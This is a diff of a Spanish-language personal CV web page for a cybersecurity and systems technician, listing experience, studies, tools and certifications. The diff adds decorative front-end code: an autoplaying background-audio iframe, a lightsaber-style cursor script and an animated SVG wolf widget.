+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Técnico de Sistemas</div>
+        <div class="exp-company"><a href="https://gruposermicro.com/" target="_blank">Sermicro</a></div>
+      </div>
+      <div class="exp-date">NOV–DIC 2023</div>
+    </div>
+    <ul class="exp-details">
+      <li>Soporte N1/N2 Windows, ticketing y resolución de incidencias 24/7.</li>
+      <li>Administración de Active Directory, GPO, DNS, DHCP.</li>
+      <li>Instalación y configuración de sistemas y software.</li>
+    </ul>
+  </div>
+
+  <div class="exp-item">
+    <div class="exp-header">
+      <div>
+        <div class="exp-title">Técnico de Sistemas</div>
+        <div class="exp-company"><a href="https://www.juntadeandalucia.es/" target="_blank">Red Guadalinfo</a> | Junta de Andalucía</div>
+      </div>
+      <div class="exp-date">ENE–MAY 2021</div>
+    </div>
+    <ul class="exp-details">
+      <li>Gestión de usuarios Windows/Linux (Guadalinex).</li>
+      <li>Configuración de servicios de red: DNS, DHCP, GPO.</li>
+      <li>Mantenimiento de redes LAN/WiFi y soporte a usuarios.</li>
+    </ul>
+  </div>
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>FORMACIÓN</h2>
+  <div class="edu-item">
+    <div class="edu-title">Máster en Ciberseguridad</div>
+    <div class="edu-school"><a href="https://www.ucam.edu/" target="_blank">Universidad Católica San Antonio de Murcia</a></div>
+    <div class="edu-date">2025 | 1.500h • 60 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Máster en Big Data & Business Intelligence</div>
+    <div class="edu-school"><a href="https://www.ui1.es/" target="_blank">Universidad Isabel I</a></div>
+    <div class="edu-date">2025 | 1.800h • 72 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Máster en Dirección de Proyectos</div>
+    <div class="edu-school"><a href="https://www.ui1.es/" target="_blank">Universidad Isabel I</a></div>
+    <div class="edu-date">2025 | 1.500h • 60 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Grado Superior en ASIR</div>
+    <div class="edu-school"><a href="https://www.ilerna.es/" target="_blank">Ilerna</a></div>
+    <div class="edu-date">2025 | 2.000h • 120 ECTS</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Grado Superior en DAM (Cursando)</div>
+    <div class="edu-school"><a href="https://www.ilerna.es/" target="_blank">Ilerna</a></div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Técnico en Ciberseguridad</div>
+    <div class="edu-school"><a href="https://www.incibe.es/" target="_blank">INCIBE</a></div>
+    <div class="edu-date">2024 | 250h</div>
+  </div>
+  <div class="edu-item">
+    <div class="edu-title">Grado en Sistemas Microinformáticos y Redes</div>
+    <div class="edu-school"><a href="https://www.ilerna.es/" target="_blank">Ilerna</a></div>
+    <div class="edu-date">2021 | 2.000h</div>
+  </div>
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>STACK TÉCNICO</h2>
+  <div class="skills-grid">
+    <div class="skill-cat">
+      <h3>SISTEMAS</h3>
+      <ul class="skill-list">
+        <li>Windows Server, AD, GPO, IIS</li>
+        <li>Linux: Kali, Ubuntu, Arch</li>
+        <li>VMware, VirtualBox</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>REDES</h3>
+      <ul class="skill-list">
+        <li>TCP/IP, DNS, DHCP, VLANs</li>
+        <li>VPN, pfSense, OPNsense, IPFire</li>
+        <li>Firewalls, DMZ</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>DESARROLLO</h3>
+      <ul class="skill-list">
+        <li>Python, Bash, PowerShell</li>
+        <li>Git, HTML/CSS, JS/TS, Java</li>
+        <li>SQL: PostgreSQL, MySQL</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>SEGURIDAD</h3>
+      <ul class="skill-list">
+        <li>Nmap, Wireshark, OWASP ZAP, Metasploit</li>
+        <li>Hydra, JTR, Medusa, Ghidra, CyberChef</li>
+        <li>OSINT, Forensics, Hardening</li>
+        <li>ISO 27001, ENS, RGPD</li>
+      </ul>
+    </div>
+    <div class="skill-cat">
+      <h3>HERRAMIENTAS</h3>
+      <ul class="skill-list">
+        <li>Jira, Confluence, NinjaOne RMM</li>
+        <li>HTB, TryHackMe, VulnHub</li>
+        <li>Docker, Azure (AZ-204)</li>
+      </ul>
+    </div>
+  </div>
+  <p style="margin-top:0.7rem;font-size:0.75rem;color:var(--text-dim);">
+    <span class="tag">+100 CERTS</span> disponibles bajo demanda
+  </p>
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>CERTIFICACIONES — CIBERSEGURIDAD</h2>
+  <div class="cert-grid">
+    <div class="cert-item"><strong>ISO 27001:2022</strong> Lead Auditor</div>
+    <div class="cert-item"><strong>ISO 27001:2022</strong> Security Associate</div>
+    <div class="cert-item"><strong>CTIGA</strong> Threat Intelligence</div>
+    <div class="cert-item"><strong>C-OSIA</strong> OSINT Analyst</div>
+    <div class="cert-item"><strong>CRPO</strong> Ransomware Protection</div>
+    <div class="cert-item"><strong>CSCSO</strong> SME Cyber Security Officer</div>
+    <div class="cert-item"><strong>CCSC</strong> Cybersecurity Career Starter</div>
+    <div class="cert-item"><strong>OSForensics</strong> Triage</div>
+    <div class="cert-item"><strong>CyberSOC N1</strong> Resility</div>
+    <div class="cert-item"><strong>Threat Hunting</strong> Resility</div>
+    <div class="cert-item"><strong>SOC 101</strong> Operaciones Seguridad</div>
+    <div class="cert-item"><strong>ICS300</strong> Industrial Control Systems</div>
+    <div class="cert-item"><strong>PMJ</strong> Ethical Hacking</div>
+    <div class="cert-item"><strong>Pentesting Pro</strong> HackerMentor</div>
+    <div class="cert-item"><strong>Pentesting 101</strong> 8dot8</div>
+    <div class="cert-item"><strong>Bug Bounty</strong> LionxSecurity</div>
+    <div class="cert-item"><strong>Ethical Hacker</strong> Cisco</div>
+    <div class="cert-item"><strong>NDE</strong> EC-Council</div>
+    <div class="cert-item"><strong>SQL Injection</strong> EC-Council</div>
+    <div class="cert-item"><strong>XSS Defenses</strong> Linux Foundation</div>
+    <div class="cert-item"><strong>Cybersecurity Essentials</strong> Linux Foundation</div>
+    <div class="cert-item"><strong>Auditoría Ciberseguridad</strong> 8dot8</div>
+    <div class="cert-item"><strong>Fundamentos CISO</strong> 8dot8</div>
+    <div class="cert-item"><strong>Linux 101</strong> 8dot8</div>
+    <div class="cert-item"><strong>Kali Linux 101</strong> Academia Ciberseguridad</div>
+    <div class="cert-item"><strong>Linux Unhatched</strong> Cisco</div>
+    <div class="cert-item"><strong>Bash Pentesting</strong> LinkedIn Learning</div>
+    <div class="cert-item"><strong>Bash Scripting</strong> DevOps Bootcamp</div>
+    <div class="cert-item"><strong>Deep Web & Darknet</strong> Enhacke/ExorciseThat</div>
+    <div class="cert-item"><strong>C1b3rwall CNP</strong> 2023, 2025</div>
+    <div class="cert-item"><strong>Cisco Switching CCNP</strong> Min. Interior</div>
+    <div class="cert-item"><strong>Protección Dispositivos Red</strong> Adams</div>
+    <div class="cert-item"><strong>Soporte IT Profesional</strong> Fundae</div>
+    <div class="cert-item"><strong>Protección de Datos</strong> Resility/IBM/Hermes</div>
+  </div>
+</section>
+
+<section>
+  <h2>CERTIFICACIONES — DESARROLLO & CLOUD</h2>
+  <div class="cert-grid">
+    <div class="cert-item"><strong>AZ-204</strong> Azure Bootcamp</div>
+    <div class="cert-item"><strong>Python Backend</strong> IBM (Flask, Django)</div>
+    <div class="cert-item"><strong>Python Profesional</strong> Código Facilito/IBM</div>
+    <div class="cert-item"><strong>Django Masterclass</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Flask</strong> IBM</div>
+    <div class="cert-item"><strong>PHP & MySQL</strong> Euroformac</div>
+    <div class="cert-item"><strong>Docker</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Git</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Front-End Web</strong> Smartmind</div>
+    <div class="cert-item"><strong>Apps Móviles</strong> UCM</div>
+    <div class="cert-item"><strong>Full Stack Data Science</strong> TPoint</div>
+    <div class="cert-item"><strong>Ciencia de Datos</strong> Código Facilito</div>
+    <div class="cert-item"><strong>Administración Sistemas IT</strong> Fundae</div>
+  </div>
+</section>
+
+<section>
+  <h2>CERTIFICACIONES — GESTIÓN & OTROS</h2>
+  <div class="cert-grid">
+    <div class="cert-item"><strong>PMI</strong> Gestión Proyectos/Programas</div>
+    <div class="cert-item"><strong>Six Sigma</strong> Green Belt</div>
+    <div class="cert-item"><strong>SLA IT</strong> LinkedIn Learning</div>
+    <div class="cert-item"><strong>IT Recruitment TOP Scorer 2025</strong> Editx</div>
+    <div class="cert-item"><strong>Piloto Dron UAS A1/A3</strong> AESA</div>
+    <div class="cert-item"><strong>Técnico Protección Civil</strong> UCJC (425h)</div>
+    <div class="cert-item"><strong>Psicología del Deporte</strong> COI</div>
+    <div class="cert-item"><strong>Psicólogo Crisis y Emergencias</strong> UCJC</div>
+    <div class="cert-item"><strong>Coaching Ejecutivo</strong> Udemy/EBS</div>
+    <div class="cert-item"><strong>PNL Master Practitioner</strong> iGNLP</div>
+  </div>
+</section>
+
+<div class="divider">════════════════════════════════════════════════</div>
+
+<section>
+  <h2>LABORATORIOS & COMUNIDADES</h2>
+  <ul class="projects-list">
+    <li><strong>GitHub:</strong> Zyanetralys — Python, automatización, pentesting, Java, SQL</li>
+    <li><strong>Blue Team:</strong> Let'sDefend, CyberDefenders, SOC 101</li>
+    <li><strong>CTF/Pentesting:</strong> HackTheBox, TryHackMe, VulnHub, PicoCTF, OverTheWire, Root-Me</li>
+    <li><strong>Comunidades:</strong> XSec, C1b3rwall, DragonJAR, UnderC0de, Women IT, CyberRangers</li>
+  </ul>
+</section>
+
+<section>
+  <h2>DISPONIBILIDAD</h2>
+  <div class="availability">
+    <span>[+]</span> REMOTO / HÍBRIDO / PRESENCIAL &nbsp;&nbsp;
+    <span>[+]</span> MADRID / CÁDIZ / MOVILIDAD NACIONAL &nbsp;&nbsp;
+    <span>[+]</span> INCORPORACIÓN INMEDIATA
+  </div>
+</section>
+
+<footer>
+</footer>
+
+<!-- BOTÓN DE AUDIO (Estilo Cyberpunk) -->
+<div style="text-align:center; margin-top:1rem;">
+  <button class="audio-btn" id="audioBtn" onmouseenter="setLightsaberMode('blue')" onmouseleave="setLightsaberMode('green')" onclick="toggleAudio()">[ 🔇 AMBIENT SOUND ]</button>
+</div>
+
+<!-- VIDEO OCULTO (Solo Audio) - AUTOPLAY CON SONIDO -->
+<div class="audio-hidden">
+  <iframe 
+    id="ytAudio"
+    src="https://www.youtube.com/embed/EZbF76GxsN8?autoplay=1&mute=0&controls=0&modestbranding=1&loop=1&playlist=EZbF76GxsN8&enablejsapi=1" 
+    title="Background Audio"
+    allow="autoplay; encrypted-media">
+  </iframe>
+</div>
+
+<script>
+  let isMuted = true;
+  
+  function toggleAudio() {
+    const btn = document.getElementById('audioBtn');
+    const iframe = document.getElementById('ytAudio');
+    
+    if (isMuted) {
+      iframe.src = iframe.src.replace('mute=1', 'mute=0');
+      btn.innerHTML = '[ 🔊 SOUND: ON ]';
+      btn.style.animation = 'pulse 1s infinite';
+      isMuted = false;
+    } else {
+      iframe.src = iframe.src.replace('mute=0', 'mute=1');
+      btn.innerHTML = '[ 🔇 AMBIENT SOUND ]';
+      btn.style.animation = 'none';
+      isMuted = true;
+    }
+  }
+
+  // --- LIGHTSABER CURSOR SCRIPT ---
+  const lightsaber = document.getElementById('lightsaber');
+  let currentMode = 'green';
+  
+  // Función para cambiar entre modo verde y azul
+  function setLightsaberMode(mode) {
+    if (mode !== currentMode) {
+      lightsaber.classList.remove(currentMode);
+      lightsaber.classList.add(mode);
+      currentMode = mode;
+    }
+  }
+  
+  if (lightsaber && window.matchMedia('(hover: hover) and (pointer: fine)').matches) {
+    // Detectar todos los elementos cliqueables
+    const clickableElements = document.querySelectorAll('a, button, .audio-btn, .cert-item, .skill-cat, .exp-item, .edu-item');
+    
+    // Añadir eventos a todos los elementos cliqueables
+    clickableElements.forEach(el => {
+      el.addEventListener('mouseenter', () => setLightsaberMode('blue'));
+      el.addEventListener('mouseleave', () => setLightsaberMode('green'));
+    });
+
+    // Movimiento del cursor - la punta sigue exactamente el ratón
+    document.addEventListener('mousemove', (e) => {
+      lightsaber.style.left = e.clientX + 'px';
+      lightsaber.style.top = e.clientY + 'px';
+    });
+
+    // Efecto al hacer click (la punta se intensifica)
+    document.addEventListener('mousedown', () => {
+      if (currentMode === 'green') {
+        lightsaber.style.filter = 'drop-shadow(0 0 18px rgba(0,255,65,1)) drop-shadow(0 0 36px rgba(0,255,65,0.8)) drop-shadow(0 0 54px rgba(0,255,65,0.6))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-52deg)';
+      } else {
+        lightsaber.style.filter = 'drop-shadow(0 0 20px rgba(0,150,255,1)) drop-shadow(0 0 40px rgba(0,150,255,0.8)) drop-shadow(0 0 60px rgba(0,150,255,0.6))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-52deg)';
+      }
+    });
+
+    document.addEventListener('mouseup', () => {
+      if (currentMode === 'green') {
+        lightsaber.style.filter = 'drop-shadow(0 0 8px rgba(0,255,65,0.8)) drop-shadow(0 0 16px rgba(0,255,65,0.6)) drop-shadow(0 0 24px rgba(0,255,65,0.4))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-45deg)';
+      } else {
+        lightsaber.style.filter = 'drop-shadow(0 0 10px rgba(0,150,255,0.9)) drop-shadow(0 0 20px rgba(0,150,255,0.7)) drop-shadow(0 0 30px rgba(0,150,255,0.5))';
+        lightsaber.style.transform = 'translate(-40%, -8%) rotate(-45deg)';
+      }
+    });
+  }
+</script>
+
+  <div id="cyber-wolf-core">
   <div class="wolf-hud">
     <div class="hud-row">
       <div class="hud-metric" id="m-cpu"><span class="lbl">CPU</span><span class="val">00%</span><div class="bar"><div class="fill"></div></div></div>
@@ -8,7 +1422,7 @@
     </div>
   </div>
 
-  <svg id="wolf-svg" viewBox="0 0 340 340" width="190" height="190">
+  <svg id="wolf-svg" viewBox="0 0 340 340" width="185" height="185">
     <defs>
       <linearGradient id="wolfDark" x1="0%" y1="0%" x2="100%" y2="100%">
         <stop offset="0%" stop-color="#0a0f1a"/><stop offset="35%" stop-color="#151c2c"/><stop offset="70%" stop-color="#1e293b"/><stop offset="100%" stop-color="#050810"/>
@@ -22,90 +1436,72 @@
       <radialGradient id="eyeGlow" cx="50%" cy="50%" r="65%">
         <stop offset="0%" stop-color="#00f0ff"/><stop offset="45%" stop-color="#00b4d8"/><stop offset="100%" stop-color="#005f73"/>
       </radialGradient>
-      <filter id="glow"><feGaussianBlur stdDeviation="4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
-      <filter id="glowStrong"><feGaussianBlur stdDeviation="7" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
-      <filter id="shadow"><feDropShadow dx="0" dy="6" stdDeviation="6" flood-color="#000" flood-opacity="0.75"/></filter>
-      <clipPath id="eyeClip"><ellipse rx="11" ry="7"/></clipPath>
+      <filter id="glow"><feGaussianBlur stdDeviation="3.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+      <filter id="glowStrong"><feGaussianBlur stdDeviation="6" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+      <filter id="shadow"><feDropShadow dx="0" dy="5" stdDeviation="5" flood-color="#000" flood-opacity="0.7"/></filter>
+      <clipPath id="eyeClip"><ellipse rx="10" ry="6.5"/></clipPath>
     </defs>
 
-    <!-- Anillos scanner dinámicos -->
-    <circle cx="170" cy="170" r="155" fill="none" stroke="#00f0ff" stroke-width="1" stroke-dasharray="4 10" opacity="0.25">
-      <animateTransform attributeName="transform" type="rotate" from="0 170 170" to="360 170 170" dur="20s" repeatCount="indefinite"/>
+    <circle cx="170" cy="170" r="155" fill="none" stroke="#00f0ff" stroke-width="0.8" stroke-dasharray="3 9" opacity="0.22">
+      <animateTransform attributeName="transform" type="rotate" from="0 170 170" to="360 170 170" dur="22s" repeatCount="indefinite"/>
     </circle>
-    <circle cx="170" cy="170" r="148" fill="none" stroke="#ff003c" stroke-width="0.6" stroke-dasharray="3 8" opacity="0.18">
-      <animateTransform attributeName="transform" type="rotate" from="360 170 170" to="0 170 170" dur="15s" repeatCount="indefinite"/>
+    <circle cx="170" cy="170" r="148" fill="none" stroke="#ff003c" stroke-width="0.5" stroke-dasharray="2 7" opacity="0.15">
+      <animateTransform attributeName="transform" type="rotate" from="360 170 170" to="0 170 170" dur="16s" repeatCount="indefinite"/>
     </circle>
 
-    <!-- Orejas de lobo (erguidas, puntiagudas, anatómicas) -->
     <path d="M102,115 L82,48 L115,88 Z" fill="url(#wolfDark)" filter="url(#shadow)"/>
     <path d="M238,115 L258,48 L225,88 Z" fill="url(#wolfDark)" filter="url(#shadow)"/>
-    <path d="M90,68 L96,56 L106,72" stroke="url(#wolfLight)" fill="none" stroke-width="1" opacity="0.6"/>
-    <path d="M250,68 L244,56 L234,72" stroke="url(#wolfLight)" fill="none" stroke-width="1" opacity="0.6"/>
-    <ellipse cx="102" cy="62" rx="6" ry="11" fill="#0a0f1a" opacity="0.5"/>
-    <ellipse cx="238" cy="62" rx="6" ry="11" fill="#0a0f1a" opacity="0.5"/>
+    <path d="M90,68 L96,56 L106,72" stroke="url(#wolfLight)" fill="none" stroke-width="0.9" opacity="0.55"/>
+    <path d="M250,68 L244,56 L234,72" stroke="url(#wolfLight)" fill="none" stroke-width="0.9" opacity="0.55"/>
+    <ellipse cx="102" cy="62" rx="5.5" ry="10" fill="#0a0f1a" opacity="0.45"/>
+    <ellipse cx="238" cy="62" rx="5.5" ry="10" fill="#0a0f1a" opacity="0.45"/>
 
-    <!-- Cabeza de lobo realista (forma triangular alargada) -->
     <path d="M115,105 C138,82 202,82 225,105 C248,128 242,172 208,205 C174,238 166,238 132,205 C98,172 92,128 115,105 Z" fill="url(#wolfDark)" filter="url(#shadow)"/>
-    
-    <!-- Marcas de pelaje en frente -->
-    <path d="M145,118 Q170,132 195,118" stroke="url(#wolfMid)" fill="none" stroke-width="1.8" opacity="0.6"/>
-    <path d="M132,132 Q170,148 208,132" stroke="url(#wolfMid)" fill="none" stroke-width="1.2" opacity="0.5"/>
-    <path d="M155,108 L170,118 L185,108" stroke="url(#wolfLight)" fill="none" stroke-width="1" opacity="0.4"/>
+    <path d="M145,118 Q170,132 195,118" stroke="url(#wolfMid)" fill="none" stroke-width="1.6" opacity="0.55"/>
+    <path d="M132,132 Q170,148 208,132" stroke="url(#wolfMid)" fill="none" stroke-width="1" opacity="0.45"/>
+    <path d="M155,108 L170,118 L185,108" stroke="url(#wolfLight)" fill="none" stroke-width="0.8" opacity="0.35"/>
 
-    <!-- Hocico alargado característico de lobo -->
-    <ellipse cx="170" cy="162" rx="46" ry="32" fill="url(#wolfMid)"/>
-    <path d="M135,145 Q170,132 205,145 L200,185 Q170,200 140,185 Z" fill="url(#wolfDark)" opacity="0.75"/>
-    <path d="M142,152 Q170,142 198,152" stroke="url(#wolfLight)" fill="none" stroke-width="1" opacity="0.4"/>
+    <ellipse cx="170" cy="162" rx="44" ry="30" fill="url(#wolfMid)"/>
+    <path d="M135,145 Q170,132 205,145 L200,185 Q170,200 140,185 Z" fill="url(#wolfDark)" opacity="0.7"/>
+    <path d="M142,152 Q170,142 198,152" stroke="url(#wolfLight)" fill="none" stroke-width="0.8" opacity="0.35"/>
 
-    <!-- Ojos de lobo (almendrados, penetrantes, posición lateral) -->
     <g id="eyeL" style="transform-origin: 132px 148px;">
-      <ellipse cx="132" cy="148" rx="11" ry="7" fill="url(#eyeGlow)" filter="url(#glow)"/>
-      <circle id="pupilL" cx="132" cy="148" r="4" fill="#050810" clip-path="url(#eyeClip)"/>
-      <circle cx="134.5" cy="145.5" r="1.5" fill="#fff" opacity="0.9"/>
-      <circle cx="130" cy="150" r="0.8" fill="#fff" opacity="0.5"/>
+      <ellipse cx="132" cy="148" rx="10" ry="6.5" fill="url(#eyeGlow)" filter="url(#glow)"/>
+      <circle id="pupilL" cx="132" cy="148" r="3.8" fill="#050810" clip-path="url(#eyeClip)"/>
+      <circle cx="134.2" cy="146.2" r="1.2" fill="#fff" opacity="0.85"/>
     </g>
     <g id="eyeR" style="transform-origin: 208px 148px;">
-      <ellipse cx="208" cy="148" rx="11" ry="7" fill="url(#eyeGlow)" filter="url(#glow)"/>
-      <circle id="pupilR" cx="208" cy="148" r="4" fill="#050810" clip-path="url(#eyeClip)"/>
-      <circle cx="210.5" cy="145.5" r="1.5" fill="#fff" opacity="0.9"/>
-      <circle cx="206" cy="150" r="0.8" fill="#fff" opacity="0.5"/>
+      <ellipse cx="208" cy="148" rx="10" ry="6.5" fill="url(#eyeGlow)" filter="url(#glow)"/>
+      <circle id="pupilR" cx="208" cy="148" r="3.8" fill="#050810" clip-path="url(#eyeClip)"/>
+      <circle cx="210.2" cy="146.2" r="1.2" fill="#fff" opacity="0.85"/>
     </g>
 
-    <!-- Párpados para parpadeo -->
-    <rect id="lidL" x="121" y="141" width="22" height="14" fill="url(#wolfDark)" opacity="0" rx="5"/>
-    <rect id="lidR" x="197" y="141" width="22" height="14" fill="url(#wolfDark)" opacity="0" rx="5"/>
+    <rect id="lidL" x="122" y="141" width="20" height="13" fill="url(#wolfDark)" opacity="0" rx="4"/>
+    <rect id="lidR" x="198" y="141" width="20" height="13" fill="url(#wolfDark)" opacity="0" rx="4"/>
 
-    <!-- Nariz negra de lobo -->
     <path d="M155,158 L185,158 L170,175 Z" fill="#050810"/>
-    <ellipse cx="170" cy="164" rx="2.5" ry="1.5" fill="#fff" opacity="0.3"/>
+    <ellipse cx="170" cy="164" rx="2" ry="1.2" fill="#fff" opacity="0.25"/>
+    <path d="M142,182 Q170,195 198,182" stroke="#151c2c" fill="none" stroke-width="1" opacity="0.5"/>
+    <path d="M130,168 L125,180" stroke="url(#wolfLight)" fill="none" stroke-width="0.7" opacity="0.35"/>
+    <path d="M210,168 L215,180" stroke="url(#wolfLight)" fill="none" stroke-width="0.7" opacity="0.35"/>
 
-    <!-- Boca y líneas de expresión -->
-    <path d="M142,182 Q170,195 198,182" stroke="#151c2c" fill="none" stroke-width="1.2" opacity="0.6"/>
-    <path d="M130,168 L125,180" stroke="url(#wolfLight)" fill="none" stroke-width="0.8" opacity="0.4"/>
-    <path d="M210,168 L215,180" stroke="url(#wolfLight)" fill="none" stroke-width="0.8" opacity="0.4"/>
+    <path d="M108,155 Q118,168 112,182" stroke="#475569" fill="none" stroke-width="0.9" opacity="0.4"/>
+    <path d="M232,155 Q222,168 228,182" stroke="#475569" fill="none" stroke-width="0.9" opacity="0.4"/>
+    <path d="M125,195 Q170,212 215,195" stroke="#334155" fill="none" stroke-width="1.2" opacity="0.3"/>
 
-    <!-- Detalles de pelaje en cuello/mejillas -->
-    <path d="M108,155 Q118,168 112,182" stroke="#475569" fill="none" stroke-width="1" opacity="0.45"/>
-    <path d="M232,155 Q222,168 228,182" stroke="#475569" fill="none" stroke-width="1" opacity="0.45"/>
-    <path d="M125,195 Q170,212 215,195" stroke="#334155" fill="none" stroke-width="1.4" opacity="0.35"/>
-
-    <!-- Líneas cyberpunk integradas -->
-    <g stroke="#00f0ff" stroke-width="1.2" fill="none" opacity="0.6" stroke-dasharray="2 5">
-      <path d="M170,95 L170,48"><animate attributeName="opacity" values="0.6;1;0.6" dur="2s" repeatCount="indefinite"/></path>
+    <g stroke="#00f0ff" stroke-width="1" fill="none" opacity="0.55" stroke-dasharray="2 5">
+      <path d="M170,95 L170,48"><animate attributeName="opacity" values="0.55;0.9;0.55" dur="2s" repeatCount="indefinite"/></path>
       <path d="M148,122 L105,92"/>
       <path d="M192,122 L235,92"/>
-      <path d="M122,168 L88,188" opacity="0.4"/>
-      <path d="M218,168 L252,188" opacity="0.4"/>
+      <path d="M122,168 L88,188" opacity="0.35"/>
+      <path d="M218,168 L252,188" opacity="0.35"/>
     </g>
-    <circle cx="170" cy="46" r="3.5" fill="#00f0ff" filter="url(#glowStrong)">
-      <animate attributeName="r" values="3.5;5.5;3.5" dur="1.6s" repeatCount="indefinite"/>
-      <animate attributeName="opacity" values="1;0.6;1" dur="1.6s" repeatCount="indefinite"/>
+    <circle cx="170" cy="46" r="3" fill="#00f0ff" filter="url(#glowStrong)">
+      <animate attributeName="r" values="3;4.8;3" dur="1.6s" repeatCount="indefinite"/>
     </circle>
 
-    <!-- Efecto respiración sutil -->
-    <ellipse cx="170" cy="155" rx="52" ry="56" fill="url(#wolfDark)" opacity="0.05">
-      <animate attributeName="rx" values="52;55;52" dur="4s" repeatCount="indefinite"/>
-      <animate attributeName="ry" values="56;59;56" dur="4s" repeatCount="indefinite"/>
+    <ellipse cx="170" cy="155" rx="50" ry="54" fill="url(#wolfDark)" opacity="0.04">
+      <animate attributeName="rx" values="50;53;50" dur="4s" repeatCount="indefinite"/>
     </ellipse>
   </svg>
 
@@ -115,52 +1511,48 @@
   </div>
 </div>
 
-<!-- Toast notifications -->
 <div id="toast-container"></div>
-
 <canvas id="cyber-particles" style="position:fixed;inset:0;pointer-events:none;z-index:-1;"></canvas>
 
 <style>
-:root{--cyber:#00f0ff;--cyber2:#00b4d8;--warn:#ff003c;--ok:#bfff00;--bg:rgba(8,12,20,.94);--border:#1a2234;--text:#e2e8f0;--text2:#64748b;--mono:'JetBrains Mono','Courier New',monospace}
-#cyber-wolf-ultimate{position:fixed;bottom:24px;right:24px;z-index:99999;display:flex;flex-direction:column;align-items:flex-end;gap:10px;cursor:pointer;user-select:none;font-family:var(--mono);opacity:0;transform:translateY(8px);transition:opacity .4s,transform .4s}
+:root{--cyber:#00f0ff;--cyber2:#00b4d8;--warn:#ff003c;--ok:#bfff00;--bg:rgba(8,12,20,.93);--border:#1a2234;--text:#e2e8f0;--text2:#64748b;--mono:'JetBrains Mono','Courier New',monospace}
+#cyber-wolf-core{position:fixed;bottom:24px;right:24px;z-index:99999;display:flex;flex-direction:column;align-items:flex-end;gap:10px;cursor:pointer;user-select:none;font-family:var(--mono);opacity:0;transform:translateY(8px);transition:opacity .4s,transform .4s}
 .hud-row{display:flex;gap:10px;padding:6px 10px;background:rgba(12,18,30,.88);border:1px solid var(--border);border-radius:8px;backdrop-filter:blur(12px);box-shadow:0 4px 14px rgba(0,0,0,.45)}
-.hud-metric{display:flex;flex-direction:column;gap:3px;width:44px}
+.hud-metric{display:flex;flex-direction:column;gap:3px;width:42px}
 .lbl{font-size:7px;color:var(--text2);text-transform:uppercase;letter-spacing:.4px;opacity:.85}
 .val{font-size:9px;font-weight:700;color:var(--cyber);white-space:nowrap}
 .bar{height:2px;background:#0f172a;border-radius:1px;overflow:hidden}
-.fill{height:100%;width:0%;transition:width .35s cubic-bezier(.4,0,.2,1),background .3s}
+.fill{height:100%;width:0%;transition:width .3s cubic-bezier(.4,0,.2,1),background .3s}
 #wolf-svg{transition:filter .3s,transform .3s;display:block}
-#cyber-wolf-ultimate:hover #wolf-svg{transform:scale(1.05)}
-#cyber-wolf-ultimate.active #wolf-svg{filter:drop-shadow(0 0 14px var(--cyber))}
-#cyber-wolf-ultimate.focus #wolf-svg{filter:drop-shadow(0 0 12px var(--warn));animation:pulseWarn 1.2s infinite}
-@keyframes pulseWarn{0%,100%{filter:drop-shadow(0 0 12px var(--warn))}50%{filter:drop-shadow(0 0 20px var(--warn))}}
+#cyber-wolf-core:hover #wolf-svg{transform:scale(1.04)}
+#cyber-wolf-core.active #wolf-svg{filter:drop-shadow(0 0 12px var(--cyber))}
+#cyber-wolf-core.focus #wolf-svg{filter:drop-shadow(0 0 10px var(--warn));animation:pulseWarn 1.2s infinite}
+@keyframes pulseWarn{0%,100%{filter:drop-shadow(0 0 10px var(--warn))}50%{filter:drop-shadow(0 0 18px var(--warn))}}
 #wolf-lidL,#wolf-lidR{transition:opacity .12s}
-.wolf-log{width:310px;background:var(--bg);border:1px solid var(--border);border-radius:10px;overflow:hidden;backdrop-filter:blur(16px);box-shadow:0 8px 26px rgba(0,0,0,.6)}
+.wolf-log{width:300px;background:var(--bg);border:1px solid var(--border);border-radius:10px;overflow:hidden;backdrop-filter:blur(16px);box-shadow:0 8px 26px rgba(0,0,0,.55)}
 .log-header{display:flex;align-items:center;gap:6px;padding:7px 11px;font-size:8px;color:var(--text2);letter-spacing:.9px;border-bottom:1px solid var(--border)}
 .log-header .dot{width:4px;height:4px;background:var(--cyber);border-radius:50%;animation:pulse 1.6s infinite}
 @keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 5px var(--cyber)}50%{opacity:.25;box-shadow:none}}
-.log-content{height:72px;padding:7px 11px;color:var(--text);font-size:9.5px;line-height:1.45;overflow:hidden;display:flex;flex-direction:column;justify-content:flex-end}
-.log-content div{opacity:0;transform:translateY(3px);transition:all .15s ease}
+.log-content{height:70px;padding:7px 11px;color:var(--text);font-size:9px;line-height:1.4;overflow:hidden;display:flex;flex-direction:column;justify-content:flex-end}
+.log-content div{opacity:0;transform:translateY(3px);transition:all .14s ease}
 .log-content div.show{opacity:1;transform:translateY(0)}
-.cmd{color:var(--cyber2)}.out{color:var(--text2)}.warn{color:var(--warn)}.ok{color:var(--ok)}.info{color:#60a5fa}
-/* Toast notifications */
-#toast-container{position:fixed;bottom:110px;right:24px;z-index:100000;display:flex;flex-direction:column;gap:6px;pointer-events:none}
